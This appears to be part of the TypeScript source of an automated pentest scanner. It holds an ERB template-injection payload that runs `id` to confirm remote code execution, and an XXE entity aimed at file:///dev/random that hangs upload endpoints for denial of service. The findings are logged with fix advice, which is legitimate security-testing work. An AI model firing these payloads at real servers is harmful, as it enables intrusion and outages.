    engine: "erb",
    payload: `<%= \`id\` %>`,
    marker: /uid=\d+/,
  },
]

async function sstiEscalationScan(input: ScanInput): Promise<void> {
  // Only run if sstiScan already found an SSTI vuln
  const existing = Vulnerability.get(input.sessionID)
  const sstiVuln = existing.find((v) => /Server-Side Template Injection/i.test(v.title ?? ""))
  if (!sstiVuln) {
    log.info("ssti-escalation: no prior SSTI finding, skipping")
    return
  }

  const token = input.token ?? getToken(input.sessionID)
  if (!token) return
  const cookieHeaders: Record<string, string> = { Cookie: `token=${token}` }

  for (const rce of SSTI_RCE_PAYLOADS) {
    const updateRes = await safeFetch(input.target + "/profile", "POST", {
      headers: { ...cookieHeaders, "Content-Type": "application/x-www-form-urlencoded" },
      body: `username=${encodeURIComponent(rce.payload)}`,
    })
    if (!updateRes || updateRes.status >= 400) continue

    for (const renderPath of RENDER_PATHS) {
      const renderRes = await safeFetch(input.target + renderPath, "GET", { headers: cookieHeaders })
      if (!renderRes || renderRes.status >= 400) continue

      if (rce.marker.test(renderRes.body)) {
        log.info("ssti-escalation: RCE CONFIRMED", { engine: rce.engine, path: renderPath })

        const matched = renderRes.body.match(rce.marker)?.[0] ?? "(matched)"
        Vulnerability.add({
          sessionID: input.sessionID,
          data: {
            severity: "critical",
            title: `SSTI Remote Code Execution (${rce.engine})`,
            description: `SSTI escalated to RCE via ${rce.engine} template engine on /profile. Payload: ${rce.payload.slice(0, 80)}... Server executed OS command and returned "${matched}".`,
            cwe_id: "CWE-94",
            endpoint: `GET ${renderPath}`,
            attack_vector: "request_body",
            steps_to_reproduce: [
              `1. POST ${input.target}/profile with username = "${rce.payload.slice(0, 60)}..."`,
              `2. GET ${input.target}${renderPath}`,
              `3. Response contains "${matched}" — OS command executed`,
            ].join("\n"),
            business_impact:
              "Full Remote Code Execution — attacker can run arbitrary OS commands on the server.",
            recommendation: "Sandbox template rendering. Never pass user input to template engines unsanitized.",
            poc: `POST /profile username="${rce.payload.slice(0, 60)}..." → GET ${renderPath} → "${matched}"`,
          },
        })

        await safeFetch(input.target + "/profile", "POST", {
          headers: { ...cookieHeaders, "Content-Type": "application/x-www-form-urlencoded" },
          body: `username=${encodeURIComponent("scanner_restored")}`,
        })
        return
      }
    }

    // Restore after each attempt
    await safeFetch(input.target + "/profile", "POST", {
      headers: { ...cookieHeaders, "Content-Type": "application/x-www-form-urlencoded" },
      body: `username=${encodeURIComponent("scanner_test")}`,
    })
  }
}

// ── XXE DoS Escalation Scanner ───────────────────────────────────────────────
// Runs AFTER other scanners. If XXE was already confirmed, attempts DoS via
// file:///dev/random entity expansion (causes server to block reading).

async function xxeDosScan(input: ScanInput): Promise<void> {
  const existing = Vulnerability.get(input.sessionID)
  const xxeVuln = existing.find((v) => /XXE|XML External Entity/i.test(v.title ?? ""))
  if (!xxeVuln) {
    log.info("xxe-dos: no prior XXE finding, skipping")
    return
  }

  const token = input.token ?? getToken(input.sessionID)
  const authHeaders: Record<string, string> = {
    "Content-Type": "application/xml",
    ...(token ? { Authorization: `Bearer ${token}` } : {}),
  }

  const uploadPaths = ["/file-upload", "/api/Complaints", "/profile/image/upload"]

  // Baseline timing
  const baseRes = await safeFetch(input.target + "/", "GET")
  const baseElapsed = baseRes?.elapsed ?? 200

  const dosPayload = [
    `<?xml version="1.0" encoding="UTF-8"?>`,
    `<!DOCTYPE foo [`,
    `  <!ENTITY xxe SYSTEM "file:///dev/random">`,
    `]>`,
    `<root>&xxe;</root>`,
  ].join("\n")

  for (const uploadPath of uploadPaths) {
    const dosRes = await safeFetch(input.target + uploadPath, "POST", {
      headers: authHeaders,
      body: dosPayload,
    })

    if (dosRes && dosRes.elapsed > baseElapsed + 4000 && dosRes.elapsed > 5000) {
      log.info("xxe-dos: CONFIRMED", { path: uploadPath, baseElapsed, dosElapsed: dosRes.elapsed })
      Vulnerability.add({
        sessionID: input.sessionID,
        data: {
          severity: "high",
          title: `XXE Denial of Service via file:///dev/random on ${uploadPath}`,
          description: `XXE DoS confirmed on ${uploadPath}. Entity referencing file:///dev/random caused server to block for ${dosRes.elapsed}ms (baseline ${baseElapsed}ms). Server reads from /dev/random which blocks when entropy pool is exhausted.`,
          cwe_id: "CWE-611",
          endpoint: `POST ${uploadPath}`,
          attack_vector: "request_body",
          steps_to_reproduce: [
            `1. GET ${input.target}/ → ~${baseElapsed}ms (baseline)`,
            `2. POST ${input.target}${uploadPath} with XML containing <!ENTITY xxe SYSTEM "file:///dev/random">`,
            `3. Response time: ~${dosRes.elapsed}ms (server blocked reading /dev/random)`,
          ].join("\n"),
          business_impact: "Denial of Service — attacker can hang the server by forcing it to read /dev/random.",
          recommendation: "Disable external entity processing in XML parsers.",
          poc: `POST ${uploadPath} [XXE:file:///dev/random] → ${dosRes.elapsed}ms vs baseline ${baseElapsed}ms`,
        },
      })
      return
    }

    // Also try multipart upload with the XML as a file
    const formData = new FormData()
    formData.append("file", new Blob([dosPayload], { type: "application/xml" }), "xxe.xml")
    const formHeaders: Record<string, string> = token ? { Authorization: `Bearer ${token}` } : {}
    const formRes = await safeFetch(input.target + uploadPath, "POST", {
      headers: formHeaders,
      body: formData,
    })

    if (formRes && formRes.elapsed > baseElapsed + 4000 && formRes.elapsed > 5000) {
      log.info("xxe-dos: CONFIRMED (multipart)", { path: uploadPath, baseElapsed, dosElapsed: formRes.elapsed })
      Vulnerability.add({
        sessionID: input.sessionID,
        data: {
          severity: "high",
          title: `XXE Denial of Service via file upload on ${uploadPath}`,
          description: `XXE DoS confirmed via multipart file upload on ${uploadPath}. XML file with entity referencing file:///dev/random caused ${formRes.elapsed}ms response (baseline ${baseElapsed}ms).`,
          cwe_id: "CWE-611",
          endpoint: `POST ${uploadPath}`,
          attack_vector: "request_body",
          steps_to_reproduce: [
            `1. Upload XML file to ${input.target}${uploadPath} with <!ENTITY xxe SYSTEM "file:///dev/random">`,
            `2. Response time: ~${formRes.elapsed}ms (server blocked)`,
          ].join("\n"),
          business_impact: "Denial of Service via XML External Entity processing.",
          recommendation: "Disable external entity processing. Validate uploaded file types.",
          poc: `POST ${uploadPath} [multipart XXE:file:///dev/random] → ${formRes.elapsed}ms`,
        },
      })
      return
    }
  }
}

// ── Main entry point ──────────────────────────────────────────────────────────

export namespace AutoScanner {
  export async function run(input: ScanInput): Promise<void> {
    const rootID = Session.root(input.sessionID)
    log.info("auto-scanner starting", {
      sessionID: rootID,
      target: input.target,
      endpoints: input.endpoints.length,
      openApiOps: input.openApiOps.length,
      filenames: input.filenames.length,
    })

    // Phase 1: parallel primary scanners
    const results = await Promise.allSettled([
      sstiScan({ ...input, sessionID: rootID }).catch((e) =>
        log.warn("ssti-scan error", { error: String(e) }),
      ),
      zipSlipScan({ ...input, sessionID: rootID }).catch((e) =>
        log.warn("zip-slip-scan error", { error: String(e) }),
      ),
      deserScan({ ...input, sessionID: rootID }).catch((e) =>
        log.warn("deser-scan error", { error: String(e) }),
      ),
      pathBruteForceScan({ ...input, sessionID: rootID }).catch((e) =>
        log.warn("path-brute-scan error", { error: String(e) }),
      ),
      authLogicScan({ ...input, sessionID: rootID }).catch((e) =>
        log.warn("auth-logic-scan error", { error: String(e) }),
      ),
      nosqlScan({ ...input, sessionID: rootID }).catch((e) =>
        log.warn("nosql-scan error", { error: String(e) }),
      ),
    ])

    // Phase 2: escalation scanners that depend on phase-1 findings
    const escalationResults = await Promise.allSettled([
      sstiEscalationScan({ ...input, sessionID: rootID }).catch((e) =>
        log.warn("ssti-escalation error", { error: String(e) }),
      ),
      xxeDosScan({ ...input, sessionID: rootID }).catch((e) =>
        log.warn("xxe-dos error", { error: String(e) }),
      ),
    ])

    const failed =
      results.filter((r) => r.status === "rejected").length +
      escalationResults.filter((r) => r.status === "rejected").length
    log.info("auto-scanner complete", { sessionID: rootID, failed })
  }
}
